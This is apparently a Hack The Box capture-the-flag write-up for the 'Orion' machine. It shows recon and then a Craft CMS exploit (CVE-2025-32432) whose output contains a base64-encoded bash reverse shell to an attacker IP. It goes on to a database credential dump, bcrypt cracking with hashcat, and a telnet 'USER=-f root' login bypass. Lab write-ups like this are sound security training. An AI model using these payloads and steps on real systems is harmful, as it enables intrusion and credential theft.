---
title: "Orion"
date: 2026-11-05
platform: HTB
difficulty: easy
locked: false
tags: [linux, web, telnet, craftcms]
---

## Reconnaissance

As always we will check the open ports.
```bash
~/workbench/orion 
➜ sudo nmap -p- --min-rate 5000 -sS 10.129.93.141 -oG content/allPorts
[sudo] password for zodiak: 
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-04 21:41 +0100
Warning: 10.129.93.141 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.93.141
Host is up (0.082s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 39.65 seconds
~/workbench/orion 
➜ nmap -p22,80 -sVC 10.129.93.141 -oN content/targeted
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-04 21:43 +0100
Nmap scan report for 10.129.93.141
Host is up (0.067s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.19 seconds
```

With this at least we gathered a domain.
```bash
~/workbench/orion 
➜ echo -n '10.129.93.141 orion.htb' | sudo tee -a /etc/hosts
```

With `gobuster` we were able to a find a portal to login on admin pannel.
```bash
➜ gobuster dir -u http://orion.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://orion.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index                (Status: 200) [Size: 12272]
admin                (Status: 302) [Size: 0] [--> http://orion.htb/admin/login]
...
```

Accesing that path we are able to see that the page is running on `Craft CMS 5.6.16` this version seems vulnerable to [CVE-2025-32432](https://github.com/l0lsuit/CVE-2025-32432-craftcms-rce/tree/main)

## Explotation

We just will clone the repo, execute the python file (I have renamed it to `poc.py`) and try to gain a shell.
*Shell 1*
```bash
CVE-2025-32432 on  main [✘?] via  v3.14.9 (.venv) took 6s 
➜ python3 poc.py --url http://orion.htb --shell 10.10.16.85 1234 -a 1
[*] Reverse shell payload -> 10.10.16.85:1234
[*] Acquiring session + CSRF token...
[+] Session ID: uimdasgs7urb2c3sfhb1qg3u5s
[+] CSRF token: wqGGR2JTzQmVdvPygRqVEjighcxfnlIVZaDMRkEe1y2QSGY16DcfOpeY_CYzJIBto07GxbVS7XAJjcGqB_ocfyHyvCopSbhu8j4cetsDVUM=
[+] Using asset ID: 1
[*] Leaking PHP config via phpinfo gadget...
[+] session.save_path = /var/lib/php/sessions
[+] session.save_handler = files
[*] Poisoning session file with PHP payload (raw, un-encoded)...
[+] RAW PHP tag present in session! include should fire.
[*] Triggering include / command: echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44NS8xMjM0IDA+JjE= | base64 -d | bash
CVE-2025-32432 on  main [✘?] via  v3.14.9 took 1m15s
```

*Shell 2*
```bash
➜ nc -lvnp 1234       
Listening on 0.0.0.0 1234
id
Connection received on 10.129.93.141 37190
bash: cannot set terminal process group (964): Inappropriate ioctl for device
bash: no job control in this shell
www-data@orion:~/html/craft/web$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@orion:~/html/craft$ cat /etc/passwd | grep -E 'sh$'
root:x:0:0:root:/root:/bin/bash
adam:x:1000:1000::/home/adam:/bin/bash
```

## Privilege escalation

### Adam

If we check the environment variables we are able to see a database, user and password so we will login

```bash
www-data@orion:~/html/craft/web$ env
CRAFT_ENVIRONMENT=dev
CRAFT_DB_PORT=3306
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
PWD=/var/www/html/craft/web
PRIMARY_SITE_URL=http://orion.htb/
CRAFT_DB_DATABASE=orion
HOME=/var/www
CRAFT_DB_TABLE_PREFIX=
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
TERM=xterm
USER=www-data
SHLVL=3
CRAFT_DB_USER=root
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DB_SCHEMA=
_=/usr/bin/env
www-data@orion:~/html/craft/web$ mysql -u root -p orion
Enter password: SuperSecureCraft123Pass!

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 42
Server version: 10.6.23-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [orion]>
```

Inside of the database we will use the orion databse and extrat the users and their passwords.
```bash
MariaDB [orion]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| orion              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.000 sec)

MariaDB [orion]> use orion;
use orion;
Database changed
MariaDB [orion]> show tables;
+----------------------------+
| Tables_in_orion            |
+----------------------------+
| addresses                  |
| announcements              |
| assetindexdata             |
| assetindexingsessions      |
| assets                     |
| assets_sites               |
| authenticator              |
| categories                 |
| categorygroups             |
| categorygroups_sites       |
| changedattributes          |
| changedfields              |
| craftidtokens              |
| deprecationerrors          |
| drafts                     |
| elementactivity            |
| elements                   |
| elements_bulkops           |
| elements_owners            |
| elements_sites             |
| entries                    |
| entries_authors            |
| entrytypes                 |
| fieldlayouts               |
| fields                     |
| globalsets                 |
| gqlschemas                 |
| gqltokens                  |
| imagetransformindex        |
| imagetransforms            |
| info                       |
| migrations                 |
| plugins                    |
| projectconfig              |
| queue                      |
| recoverycodes              |
| relations                  |
| resourcepaths              |
| revisions                  |
| searchindex                |
| sections                   |
| sections_entrytypes        |
| sections_sites             |
| sequences                  |
| sessions                   |
| shunnedmessages            |
| sitegroups                 |
| sites                      |
| sso_identities             |
| structureelements          |
| structures                 |
| systemmessages             |
| taggroups                  |
| tags                       |
| tokens                     |
| usergroups                 |
| usergroups_users           |
| userpermissions            |
| userpermissions_usergroups |
| userpermissions_users      |
| userpreferences            |
| users                      |
| volumefolders              |
| volumes                    |
| webauthn                   |
| widgets                    |
+----------------------------+
66 rows in set (0.001 sec)
MariaDB [orion]> select id,active,username,password from users;
select id,active,username,password from users;
+----+--------+----------+--------------------------------------------------------------+
| id | active | username | password                                                     |
+----+--------+----------+--------------------------------------------------------------+
|  1 |      1 | admin    | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
+----+--------+----------+--------------------------------------------------------------+
```

now let's crack this password with `hashid` and `hashcat`

```bash
CVE-2025-32432 on  main [✘?] via  v3.14.9 took 4m6s 
➜ hashid -m '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS'
Analyzing '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]

CVE-2025-32432 on  main [✘?] via  v3.14.9 
➜ hashcat -m 3200 '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' ~/Downloads/rockyou.txt 
hashcat (v8.0.0) starting

OpenCL API (OpenCL 3.0 PoCL 7.2  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]
======================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) Ultra 9 275HX, 5893/11851 MB (5925 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Dictionary cache built:
* Filename..: /home/zodiak/Downloads/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Speed.....: 490 MiB/s
* Runtime...: 0.27s

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 18 bits, 262144 entries, 0x0003ffff mask, 1048576 bytes
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 512 MB (13745 MB free)

$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel                
                                                                                      
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/...LUg0lS
Time.Started.....: Thu Nov  5 21:28:54 2026 (34 secs)
Time.Estimated...: Thu Nov  5 21:29:28 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: Feed (/home/zodiak/Downloads/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       20 H/s (11.49ms) @ Accel:8 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 704/14344391 (0.01%)
Rejected.........: 0/704 (0.00%)
Restore.Point....: 640/14344391 (0.01%), Iterations:8192
Restore.Sub......: #01:0/8160
Candidate.Engine.: Host Generator + PCIe
Candidates.#01...: sunshine1 -> nichole

Started: Thu Nov  5 21:28:50 2026
Stopped: Thu Nov  5 21:29:29 2026
```

let's test the ssh connection.
```bash
CVE-2025-32432 on  main [✘?] via  v3.14.9 took 3s 
✗ sshpass -p 'darkangel' ssh adam@orion.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Nov  5 08:31:29 PM UTC 2026

  System load:  0.0               Processes:             230
  Usage of /:   75.2% of 5.81GB   Users logged in:       0
  Memory usage: 9%                IPv4 address for eth0: 10.129.93.231
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

adam@orion:~$
```

Now let's get the `user.txt` flag.
```bash
adam@orion:~$ cat user.txt 
3956a661973aa53df20224c3b18b05f6
```

### Root

Checking the open ports we are able to see that telnet is running.
```bash
adam@orion:~$ ss -nltp
State                Recv-Q                Send-Q                               Local Address:Port                               Peer Address:Port               Process               
LISTEN               0                     4096                                 127.0.0.53%lo:53                                      0.0.0.0:*                                        
LISTEN               0                     80                                       127.0.0.1:3306                                    0.0.0.0:*                                        
LISTEN               0                     511                                        0.0.0.0:80                                      0.0.0.0:*                                        
LISTEN               0                     128                                        0.0.0.0:22                                      0.0.0.0:*                                        
LISTEN               0                     10                                       127.0.0.1:23                                      0.0.0.0:*                                        
LISTEN               0                     128                                           [::]:22                                         [::]:*                                        
```

Checking it's version we find that it is `2.7` which is vulnerbale to [CVE-2026-24061](https://github.com/0xBlackash/CVE-2026-24061) and this allows us to login as root.
```bash
adam@orion:~$ USER="-f root" telnet -a 127.0.0.1
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/2)

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Nov  5 08:50:22 PM UTC 2026

  System load:  0.0               Processes:             232
  Usage of /:   77.8% of 5.81GB   Users logged in:       1
  Memory usage: 15%               IPv4 address for eth0: 10.129.93.231
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@orion:~#
```

Now we just need to extract the `root.txt` flag.
```bash
root@orion:~# cat /root/root.txt
be8584a2efdf9dec589054e634a523a7
```

